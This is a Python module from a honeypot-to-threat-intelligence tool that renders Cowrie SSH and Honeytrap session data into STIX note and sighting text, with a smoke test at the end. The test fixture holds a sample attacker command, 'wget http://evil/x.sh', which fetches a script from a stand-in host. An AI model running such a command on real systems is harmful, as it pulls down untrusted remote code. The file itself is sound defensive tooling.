"""tpot2cti — STIX text-rendering helpers.

Per PoC LESSONS §32 ("Honeypot-specific IoC extraction belongs in the
STIX builder, not the parser"), parsers stay pure (model-only). They
convert raw ES docs into typed Python objects; STIX-shape decisions and
text rendering for Notes / Sighting descriptions live here.

These are PURE FUNCTIONS taking AttackSession (and sometimes ParsedEvent).
No I/O, no STIX-object construction — they only produce strings the
STIXBuilder methods embed into emitted SDOs.
"""

from __future__ import annotations

import json

from tpot2cti.parsers.base import AttackSession, ParsedEvent


# ---------------------------------------------------------------------------
# Cowrie session Note body caps
# ---------------------------------------------------------------------------

#: Caps so the Note body stays well below MAX_NOTE_BODY_BYTES (64 KB).
#: Cowrie sessions with thousands of commands (rare but seen) shouldn't
#: blow the bundle; truncate gracefully.
_MAX_COMMANDS_RENDERED = 200
_MAX_COMMAND_BYTES = 8000


# ---------------------------------------------------------------------------
# Honeytrap Sighting description cap
# ---------------------------------------------------------------------------

#: Cap on payload_printable bytes preserved in the Sighting.description.
#: Per LESSONS_LEARNED §7.1 we no longer emit a separate Note per probe.
#: Keep this short — the description is a one-line summary, not a hex dump.
SIGHTING_DESC_PREVIEW_CAP = 160


# ---------------------------------------------------------------------------
# Fallback raw-doc body cap
# ---------------------------------------------------------------------------

#: Truncation cap for the raw doc JSON embedded in the Note body.
#: 4 KB is plenty for an operator to recognize the structure of an
#: unknown honeypot's event without blowing past the per-Note size cap
#: in STIXBuilder (MAX_NOTE_BODY_BYTES = 64 KB).
MAX_RAW_DOC_BYTES = 4 * 1024


# ---------------------------------------------------------------------------
# Cowrie renderers
# ---------------------------------------------------------------------------

def render_cowrie_sighting_description(session: AttackSession) -> str:
    """One-line summary baked into the Sighting.description.

    Complements the per-session Note (which carries the full
    transcript) — this short form is what shows in the indicator's
    Sightings table without clicking through.
    """
    bits: list[str] = ["Cowrie SSH"]
    if session.auth_success:
        bits.append("auth: success")
    elif session.credentials_tried:
        bits.append(f"auth: failed ({len(session.credentials_tried)} tries)")
    if session.commands:
        bits.append(f"{len(session.commands)} cmd(s)")
    if session.malware_hashes:
        bits.append(f"{len(session.malware_hashes)} file(s) dropped")
    if session.urls:
        bits.append(f"{len(session.urls)} URL(s) referenced")
    return " — ".join(bits)


def render_cowrie_session_note_body(session: AttackSession) -> str:
    """Render the markdown Note body for one Cowrie SSH session.

    Sections (omitted if empty):
      - Header with session id (short), source IP, sensor, timestamps
      - Auth result + credentials tried
      - SSH client fingerprint (HASSH + version)
      - Command transcript (code-fenced, capped at _MAX_COMMANDS_RENDERED)
      - Files downloaded (sha256)
      - URLs / domains referenced

    Returns empty string when the session has no rendering-worthy
    content — caller skips Note emission in that case.
    """
    # Skip rendering entirely if there's nothing interesting.
    # (substance filter already gates this, but a defensive check
    # avoids empty Notes if a parser change weakens the filter.)
    if not (
        session.auth_success
        or session.credentials_tried
        or session.commands
        or session.malware_hashes
        or session.urls
    ):
        return ""

    sid_short = session.session_id[:16] if session.session_id else "?"
    lines: list[str] = [
        f"# Cowrie SSH session `{sid_short}`",
        "",
        f"- **src_ip:** `{session.src_ip}`",
        f"- **sensor:** `{session.sensor_hostname}`",
        f"- **first_seen:** `{session.first_seen.isoformat()}`",
        f"- **last_seen:**  `{session.last_seen.isoformat()}`",
        f"- **events:** {session.event_count}",
    ]
    if session.dst_ports:
        lines.append(f"- **dst_port(s):** {sorted(session.dst_ports)}")

    # Auth
    lines.append("")
    lines.append("## Authentication")
    lines.append("")
    if session.auth_success:
        lines.append("- **Result:** :white_check_mark: success")
    else:
        lines.append("- **Result:** failed (no successful login)")
    if session.credentials_tried:
        shown = session.credentials_tried[:25]
        lines.append(f"- **Credentials tried** ({len(session.credentials_tried)} total"
                     + (f", first {len(shown)} shown" if len(session.credentials_tried) > 25 else "")
                     + "):")
        for u, p in shown:
            lines.append(f"  - `{u}` / `{p}`")

    # SSH fingerprint
    if session.hassh or session.ssh_version:
        lines.append("")
        lines.append("## SSH client fingerprint")
        lines.append("")
        if session.hassh:
            lines.append(f"- **HASSH:** `{session.hassh}`")
        if session.ssh_version:
            lines.append(f"- **Version string:** `{session.ssh_version}`")

    # Commands
    if session.commands:
        lines.append("")
        lines.append(f"## Commands ({len(session.commands)} executed)")
        lines.append("")
        cmds = session.commands[:_MAX_COMMANDS_RENDERED]
        truncated_count = len(session.commands) - len(cmds)
        block_lines: list[str] = []
        total_bytes = 0
        for cmd in cmds:
            line = cmd if isinstance(cmd, str) else repr(cmd)
            total_bytes += len(line.encode("utf-8")) + 1
            if total_bytes > _MAX_COMMAND_BYTES:
                block_lines.append("... [transcript truncated for size]")
                break
            block_lines.append(line)
        lines.append("```")
        lines.extend(block_lines)
        lines.append("```")
        if truncated_count > 0:
            lines.append(f"_({truncated_count} additional command(s) omitted)_")

    # Files downloaded
    if session.malware_hashes:
        lines.append("")
        lines.append(f"## Files downloaded ({len(session.malware_hashes)})")
        lines.append("")
        for h in session.malware_hashes:
            lines.append(f"- `{h}`")

    # URLs / domains
    if session.urls:
        lines.append("")
        lines.append(f"## URLs referenced ({len(session.urls)})")
        lines.append("")
        for u in session.urls:
            lines.append(f"- {u}")
    if session.domains:
        lines.append("")
        lines.append(f"## Domains derived ({len(session.domains)})")
        lines.append("")
        for d in session.domains:
            lines.append(f"- {d}")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Honeytrap renderers
# ---------------------------------------------------------------------------

def render_honeytrap_sighting_description(
    session: AttackSession, event: ParsedEvent
) -> str:
    """One-line summary baked into the Sighting's `description` field.

    Replaces the per-probe Note that V0 emitted (and the bare port-scan
    approach the PoC used). Per LESSONS_LEARNED §7.1: this is the
    right place for low-signal-per-event protocol summaries — the
    analyst sees it in OpenCTI's Sighting context without flooding
    the Notes tab.

    Example output:
      "Honeytrap probe tcp/22 — payload 187B printable, leads
      'GET / HTTP/1.1\\r\\nHost: ...' (hex 8 bytes shown)"
    """
    payload_printable = str(event.meta.get("payload_printable") or "")
    payload_hex = str(event.meta.get("payload_hex") or "")
    proto = (event.protocol or "tcp").lower()
    dst_port = event.dst_port if event.dst_port is not None else "?"

    bits: list[str] = [f"Honeytrap probe {proto}/{dst_port}"]
    if payload_printable:
        preview = payload_printable[:SIGHTING_DESC_PREVIEW_CAP]
        preview = preview.replace("\n", "\\n").replace("\r", "\\r")
        suffix = " [truncated]" if len(payload_printable) > SIGHTING_DESC_PREVIEW_CAP else ""
        bits.append(
            f"payload {len(payload_printable)}B printable, leads {preview!r}{suffix}"
        )
    elif payload_hex:
        bits.append(f"payload hex {len(payload_hex) // 2}B")
    return " — ".join(bits)


# ---------------------------------------------------------------------------
# Fallback renderers
# ---------------------------------------------------------------------------

def render_fallback_sighting_description(event: ParsedEvent, unknown_type: str) -> str:
    """One-line Sighting.description for unknown T-Pot types.

    Replaces the per-event Note we used to emit. Per LESSONS_LEARNED
    §7.1 we keep low-signal-per-event protocols out of the Notes
    tab. The analyst sees the unknown type in the Sighting context
    and the maintainer's WARNING log triggers the "add a dedicated
    parser" workflow per V1_SPEC §5.24.
    """
    proto = (event.protocol or "?").lower()
    dst = event.dst_port if event.dst_port is not None else "?"
    return (
        f"Unrecognized T-Pot type {unknown_type!r} — "
        f"{proto}/{dst} (consider opening an issue for a dedicated parser)"
    )


def render_fallback_no_ip_note_body(event: ParsedEvent, unknown_type: str) -> str:
    """Markdown body for the rare no-src_ip free-floating Note.

    Called only when an unknown-type event lacks a src_ip — without
    an IP there is no Sighting on which to hang a description, so
    a Note is the only place to surface the event in OpenCTI.
    """
    try:
        raw_pretty = json.dumps(
            event.raw_doc, indent=2, sort_keys=True, default=str,
        )
    except (TypeError, ValueError):
        raw_pretty = repr(event.raw_doc)

    if len(raw_pretty.encode("utf-8")) > MAX_RAW_DOC_BYTES:
        raw_pretty = raw_pretty[:MAX_RAW_DOC_BYTES] + "\n... [truncated]"

    src_ip_disp = event.src_ip or "missing"
    dst_port_disp = str(event.dst_port) if event.dst_port is not None else "missing"
    ts_disp = event.timestamp.isoformat()

    return (
        f"## Unrecognized T-Pot event type: {unknown_type}\n\n"
        f"Captured on sensor: {event.sensor_hostname}\n"
        f"Timestamp: {ts_disp}\n"
        f"Source IP: {src_ip_disp}\n"
        f"Destination port: {dst_port_disp}\n\n"
        f"### Raw event document (truncated)\n"
        f"```json\n{raw_pretty}\n```\n"
    )


__all__ = [
    "MAX_RAW_DOC_BYTES",
    "SIGHTING_DESC_PREVIEW_CAP",
    "render_cowrie_session_note_body",
    "render_cowrie_sighting_description",
    "render_fallback_no_ip_note_body",
    "render_fallback_sighting_description",
    "render_honeytrap_sighting_description",
]


# ---------------------------------------------------------------------------
# Smoke test — exercise each of the 5 render helpers
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timezone

    now = datetime.now(timezone.utc)

    # Build a substantive Cowrie session
    ev = ParsedEvent(
        src_ip="1.2.3.4",
        timestamp=now,
        sensor_hostname="node1",
        event_type="Cowrie",
        session_id="deadbeef0001",
        dst_port=22,
    )
    s = AttackSession.from_event(ev)
    s.auth_success = True
    s.commands = ["ls /tmp", "wget http://evil/x.sh"]
    s.malware_hashes = ["a" * 64]
    s.urls = ["http://evil/x.sh"]
    s.domains = ["evil"]
    s.credentials_tried = [("root", "root")]
    s.hassh = "fakehassh"
    s.ssh_version = "SSH-2.0-OpenSSH_7.4"

    desc = render_cowrie_sighting_description(s)
    assert "Cowrie SSH" in desc and "auth: success" in desc, desc
    print(f"render_cowrie_sighting_description: {desc!r}")

    body = render_cowrie_session_note_body(s)
    assert "# Cowrie SSH session" in body
    assert "wget http://evil/x.sh" in body
    assert "a" * 64 in body
    print(f"render_cowrie_session_note_body: {len(body)} bytes; first line: "
          f"{body.splitlines()[0]!r}")

    # Honeytrap event
    ht_ev = ParsedEvent(
        src_ip="5.6.7.8", timestamp=now, sensor_hostname="node1",
        event_type="Honeytrap", dst_port=4444, protocol="tcp",
    )
    ht_ev.meta["payload_printable"] = "GET / HTTP/1.0\r\nHost: x\r\n"
    ht_ev.meta["payload_hex"] = "474554"
    ht_s = AttackSession.from_event(ht_ev)
    ht_desc = render_honeytrap_sighting_description(ht_s, ht_ev)
    assert "Honeytrap probe tcp/4444" in ht_desc, ht_desc
    assert "payload" in ht_desc, ht_desc
    print(f"render_honeytrap_sighting_description: {ht_desc!r}")

    # Fallback event with src_ip
    fb_ev = ParsedEvent(
        src_ip="9.9.9.9", timestamp=now, sensor_hostname="node2",
        event_type="WeirdProto", dst_port=12345, protocol="tcp",
    )
    fb_desc = render_fallback_sighting_description(fb_ev, "WeirdProto")
    assert "WeirdProto" in fb_desc and "tcp/12345" in fb_desc, fb_desc
    print(f"render_fallback_sighting_description: {fb_desc!r}")

    # Fallback no-IP Note body
    fb_ev_no_ip = ParsedEvent(
        src_ip="", timestamp=now, sensor_hostname="node3",
        event_type="WeirdProto", dst_port=None,
    )
    fb_ev_no_ip.raw_doc = {"type": "WeirdProto", "blob": {"foo": "bar"}}
    note_body = render_fallback_no_ip_note_body(fb_ev_no_ip, "WeirdProto")
    assert "Source IP: missing" in note_body
    assert "Destination port: missing" in note_body
    assert "WeirdProto" in note_body
    print(f"render_fallback_no_ip_note_body: {len(note_body)} bytes; "
          f"first line: {note_body.splitlines()[0]!r}")

    print("\nAll render-helper smoke checks passed.")
